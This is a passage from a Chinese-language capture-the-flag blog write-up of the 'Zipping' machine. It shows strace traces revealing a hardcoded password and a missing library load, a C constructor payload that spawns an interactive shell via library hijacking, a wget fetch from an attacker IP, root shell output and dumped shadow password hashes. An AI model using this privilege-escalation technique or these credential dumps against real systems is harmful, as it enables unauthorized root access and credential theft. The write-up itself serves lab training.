+prlimit64(0, RLIMIT_AS, NULL, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}) = 0
+prlimit64(0, RLIMIT_CORE, NULL, {rlim_cur=0, rlim_max=RLIM64_INFINITY}) = 0
+prlimit64(0, RLIMIT_CPU, NULL, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}) = 0
+prlimit64(0, RLIMIT_CPU, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}, NULL) = 0
+prlimit64(0, RLIMIT_DATA, NULL, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}) = 0
+prlimit64(0, RLIMIT_FSIZE, NULL, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}) = 0
+prlimit64(0, RLIMIT_FSIZE, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}, NULL) = 0
+prlimit64(0, RLIMIT_LOCKS, NULL, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}) = 0
+prlimit64(0, RLIMIT_MEMLOCK, NULL, {rlim_cur=8192*1024, rlim_max=8192*1024}) = 0
+prlimit64(0, RLIMIT_NOFILE, NULL, {rlim_cur=8*1024, rlim_max=8*1024}) = 0
+prlimit64(0, RLIMIT_NPROC, NULL, {rlim_cur=15165, rlim_max=15165}) = 0
+prlimit64(0, RLIMIT_NPROC, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}, NULL) = -1 EPERM (Operation not permitted)
+prlimit64(0, RLIMIT_NPROC, {rlim_cur=15165, rlim_max=15165}, NULL) = 0
+prlimit64(0, RLIMIT_RSS, NULL, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}) = 0
+prlimit64(0, RLIMIT_RSS, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}, NULL) = 0
+prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
+fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
+fcntl(1, F_GETFL)                       = 0x2 (flags O_RDWR)
+fcntl(2, F_GETFL)                       = 0x2 (flags O_RDWR)
+openat(AT_FDCWD, &quot;/usr/lib/locale/locale-archive&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/share/locale/locale.alias&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/lib/locale/C.UTF-8/LC_CTYPE&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/lib/locale/C.utf8/LC_CTYPE&quot;, O_RDONLY|O_CLOEXEC) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=353616, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 353616, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f6e6dd0e000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache&quot;, O_RDONLY) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=27028, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 27028, PROT_READ, MAP_SHARED, 3, 0) = 0x7f6e6e011000
+close(3)                                = 0
+futex(0x7f6e6dff7a4c, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+openat(AT_FDCWD, &quot;/etc/localtime&quot;, O_RDONLY|O_CLOEXEC) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=114, ...}, AT_EMPTY_PATH) = 0
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=114, ...}, AT_EMPTY_PATH) = 0
+read(3, &quot;TZif2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;..., 4096) = 114
+lseek(3, -60, SEEK_CUR)                 = 54
+read(3, &quot;TZif2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;..., 4096) = 60
+close(3)                                = 0
+newfstatat(AT_FDCWD, &quot;/etc/sudo.conf&quot;, {st_mode=S_IFREG|0644, st_size=4573, ...}, 0) = 0
+openat(AT_FDCWD, &quot;/etc/sudo.conf&quot;, O_RDONLY) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=4573, ...}, AT_EMPTY_PATH) = 0
+read(3, &quot;#\n# Default /etc/sudo.conf file\n&quot;..., 4096) = 4096
+read(3, &quot;rity[,subsyste@priority]\n#\n# Sud&quot;..., 4096) = 477
+read(3, &quot;&quot;, 4096)                       = 0
+close(3)                                = 0
+geteuid()                               = 1001
+prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0)  = 0
+access(&quot;/usr/local/sbin/sudo&quot;, X_OK)    = -1 ENOENT (No such file or directory)
+access(&quot;/usr/local/bin/sudo&quot;, X_OK)     = -1 ENOENT (No such file or directory)
+access(&quot;/usr/sbin/sudo&quot;, X_OK)          = -1 ENOENT (No such file or directory)
+access(&quot;/usr/bin/sudo&quot;, X_OK)           = 0
+newfstatat(AT_FDCWD, &quot;/usr/bin/sudo&quot;, {st_mode=S_IFREG|S_ISUID|0755, st_size=248840, ...}, 0) = 0
+write(2, &quot;sudo&quot;, 4sudo)                     = 4
+write(2, &quot;: &quot;, 2: )                       = 2
+write(2, &quot;effective uid is not 0, is /usr/&quot;..., 133effective uid is not 0, is /usr/bin/sudo on a file system with the &#39;nosuid&#39; option set or an NFS file system without root privileges?) = 133
+ioctl(2, TCGETS, {B38400 opost isig icanon echo ...}) = 0
+)                       = 1
+write(2, &quot;\n&quot;, 1
+)                       = 1
+exit_group(1)                           = ?
++++ exited with 1 +++
+rektsu@zipping:/var/www/html/shop$ strace stock
+strace stock
+execve(&quot;/usr/bin/stock&quot;, [&quot;stock&quot;], 0x7ffc553ae780 /* 15 vars */) = 0
+brk(NULL)                               = 0x55a96286a000
+arch_prctl(0x3001 /* ARCH_??? */, 0x7ffff49a4c30) = -1 EINVAL (Invalid argument)
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6206b8a000
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=18225, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 18225, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f6206b85000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\3206\2\0\0\0\0\0&quot;..., 832) = 832
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=2072888, ...}, AT_EMPTY_PATH) = 0
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+mmap(NULL, 2117488, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f6206800000
+mmap(0x7f6206822000, 1544192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7f6206822000
+mmap(0x7f620699b000, 356352, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19b000) = 0x7f620699b000
+mmap(0x7f62069f2000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1f1000) = 0x7f62069f2000
+mmap(0x7f62069f8000, 53104, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f62069f8000
+close(3)                                = 0
+mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6206b82000
+arch_prctl(ARCH_SET_FS, 0x7f6206b82740) = 0
+set_tid_address(0x7f6206b82a10)         = 1244
+set_robust_list(0x7f6206b82a20, 24)     = 0
+rseq(0x7f6206b83060, 0x20, 0, 0x53053053) = 0
+mprotect(0x7f62069f2000, 16384, PROT_READ) = 0
+mprotect(0x55a960c89000, 4096, PROT_READ) = 0
+mprotect(0x7f6206bc0000, 8192, PROT_READ) = 0
+prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
+munmap(0x7f6206b85000, 18225)           = 0
+newfstatat(1, &quot;&quot;, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}, AT_EMPTY_PATH) = 0
+getrandom(&quot;\xe0\x99\xcd\xcc\x79\x80\x1f\x95&quot;, 8, GRND_NONBLOCK) = 8
+brk(NULL)                               = 0x55a96286a000
+brk(0x55a96288b000)                     = 0x55a96288b000
+newfstatat(0, &quot;&quot;, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}, AT_EMPTY_PATH) = 0
+write(1, &quot;Enter the password: &quot;, 20Enter the password: )    = 20
+read(0, St0ckM4nager
+St0ckM4nager
+&quot;St0ckM4nager\n&quot;, 1024)         = 13
+openat(AT_FDCWD, &quot;/home/rektsu/.config/libcounter.so&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+write(1, &quot;\n================== Menu =======&quot;..., 44
+================== Menu ==================
+) = 44
+write(1, &quot;\n&quot;, 1
+)                       = 1
+write(1, &quot;1) See the stock\n&quot;, 171) See the stock
+)      = 17
+write(1, &quot;2) Edit the stock\n&quot;, 182) Edit the stock
+)     = 18
+write(1, &quot;3) Exit the program\n&quot;, 203) Exit the program
+)   = 20
+write(1, &quot;\n&quot;, 1
+)                       = 1
+write(1, &quot;Select an option: &quot;, 18Select an option: )      = 18
+read(0, 1
+1
+&quot;1\n&quot;, 1024)                    = 2
+openat(AT_FDCWD, &quot;/root/.stock.csv&quot;, O_RDONLY) = -1 EACCES (Permission denied)
+write(1, &quot;You do not have permissions to r&quot;..., 44You do not have permissions to read the file) = 44
+lseek(0, -1, SEEK_CUR)                  = -1 ESPIPE (Illegal seek)
+exit_group(1)                           = ?
++++ exited with 1 +++
+rektsu@zipping:/var/www/html/shop$
+</code></pre>
+<p>可以看到，整个程序运行的时候，引入了 <code>/home/rektsu/.config/libcounter.so</code>这个文件<br>maybe，我们可以做一些劫持</p>
+<h2 id="priv-esclation-c"><a href="#priv-esclation-c" class="headerlink" title="priv-esclation.c"></a>priv-esclation.c</h2><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+void method()__attribute__((constructor)); 
+void method() {
+    system(&quot;/bin/bash -i&quot;);
+}
+</code></pre>
+<pre><code class="bash">#到目标机器上去执行
+wget 10.10.16.5/priv-esclation.c 
+
+gcc -shared -fpic -o /home/rektsu/.config/libcounter.so priv-esclation.c
+</code></pre>
+<pre><code class="bash">rektsu@zipping:/home/rektsu/.config$ gcc -shared -fpic -o /home/rektsu/.config/libcounter.so bash.c
+&lt; -fpic -o /home/rektsu/.config/libcounter.so priv-esclation.c
+bash.c: In function ‘method’:
+bash.c:6:13: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+    6 |             system(&quot;/bin/bash -i&quot;);
+      |             ^~~~~~
+rektsu@zipping:/home/rektsu/.config$ sudo /usr/bin/stock
+sudo /usr/bin/stock
+Enter the password: St0ckM4nager
+St0ckM4nager
+root@zipping:/home/rektsu/.config# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@zipping:/home/rektsu/.config# whoami
+whoami
+root
+</code></pre>
+<pre><code class="bash">root:$y$j9T$IYa44JPNfCWV4rqT1W1Kj/$xiHZCNOyiAOLgnHZ06gdF9jWPNR9ixmhsCwFu0Hgy9/:19548:0:99999:7:::
+rektsu:$y$j9T$wWBMg/LAoOoUB448jkabg.$8ivoFrxatQTk89/GmgCMdoByo9a1o.l8GK/Xo8BnwT3:19548:0:99999:7:::
+</code></pre>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2023-09-10T05:29:53.481Z" itemprop="dateUpdated">2023-09-10 13:29:53</time>
+</span><br>
+
+
+        
+        IF the blog help you a lot ,Buy me a cup of coffee~：<a href="/2023/09/10/Zipping/" target="_blank" rel="external">someb0dy.github.io/2023/09/10/Zipping/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="someb0dy.github.io">
+            <img src="/img/avatar.jpg" alt="Someb0dy">
+            Someb0dy
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" target="_blank" rel="noopener" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=someb0dy.github.io/2023/09/10/Zipping/&title=《Zipping》 — Someb0dy's blog&pic=someb0dy.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=someb0dy.github.io/2023/09/10/Zipping/&title=《Zipping》 — Someb0dy's blog&source=Always Be Hungry,Be Foolish" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=someb0dy.github.io/2023/09/10/Zipping/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Zipping》 — Someb0dy's blog&url=someb0dy.github.io/2023/09/10/Zipping/&via=someb0dy.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=someb0dy.github.io/2023/09/10/Zipping/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" target="_blank" rel="noopener" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2023/06/26/Squashed/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Squashed</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        IF My blog Help you A lot Please Buy me a coffee~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/ali.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Someb0dy &copy; 2015 - 2023</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" target="_blank" rel="noopener" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=someb0dy.github.io/2023/09/10/Zipping/&title=《Zipping》 — Someb0dy's blog&pic=someb0dy.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=someb0dy.github.io/2023/09/10/Zipping/&title=《Zipping》 — Someb0dy's blog&source=Always Be Hungry,Be Foolish" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=someb0dy.github.io/2023/09/10/Zipping/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Zipping》 — Someb0dy's blog&url=someb0dy.github.io/2023/09/10/Zipping/&via=someb0dy.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=someb0dy.github.io/2023/09/10/Zipping/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABv0lEQVR42u3aQW7EIAwF0N7/0lOp207otx2YVHqsomgGnrOwsOHrKx6vn3H1/mr8/s3Vm5sHLi7umJsvuf59Mlt1zjch4eLiHuSuk1dhuosPcTVPbsDFxX0mt5fI8jlxcXH/I7e62LrUwcXFfT533trIGx/VkgkXF/c8t9ow3fG8sb+Li4tb5L6KY735qP6rvDouLu4R7nrheTpLwks2TIWJcHFxx9xewkoORZpfrtcQwcXF3cDNm5v5Mj30H0kQFxf3CDdfIE9nk2Zo1CrFxcXdzJ0cXfT+O9oM4eLiPobbu5yRzJAnU1xc3M9y7zosyYMpBIaLi3uEuw6gl4aqn6N6uIuLi/sEbr4FWT9XN0BRUsPFxd3Aza9N5G3QpEDKg39zjwwXF3czt5ekeoXKXSHh4uLu5iYFRjnRxNuacusEFxf3ILdXWUwOS6rpDxcX9zx30rjsXcxqpkJcXNwj3GZCCdoiyZHMvkILFxd3zp20Mquh9hIcLi7up7jJMs3Dj3vbrLi4uA/j3lu09K5z4eLiPplbTXxJYFE7BhcX9yB30vTsXePIoc1aDRcXd8DtNUzzVJhfycqbrbi4uNu43zgztHtDs8NBAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '不想看就别看了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '你还敢回来！';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
